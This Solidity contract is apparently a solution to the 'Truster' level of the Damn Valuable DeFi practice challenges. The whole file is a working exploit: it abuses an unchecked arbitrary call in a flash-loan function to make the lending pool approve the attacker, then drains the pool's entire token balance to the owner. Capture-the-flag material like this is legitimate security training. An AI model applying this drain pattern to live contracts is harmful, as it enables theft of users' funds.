// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../DamnValuableToken.sol";
import "hardhat/console.sol";

interface IPool {
    function flashLoan(uint256 amount, address borrower, address target, bytes calldata data)
        external
        returns (bool);
}

contract ExploiterTrusterLenderPool {
    IPool public immutable pool;
    DamnValuableToken public immutable token;
    address public immutable owner;

    constructor(IPool _pool, DamnValuableToken _token) {
        owner = msg.sender;
        pool = _pool;
        token = _token;
    }

    function attack() external {
        bytes memory data = abi.encodeWithSignature("approve(address,uint256)", address(this), type(uint256).max);
        pool.flashLoan(0, address(0), address(token), data);
        token.transferFrom(address(pool), owner, token.balanceOf(address(pool)));
    }
}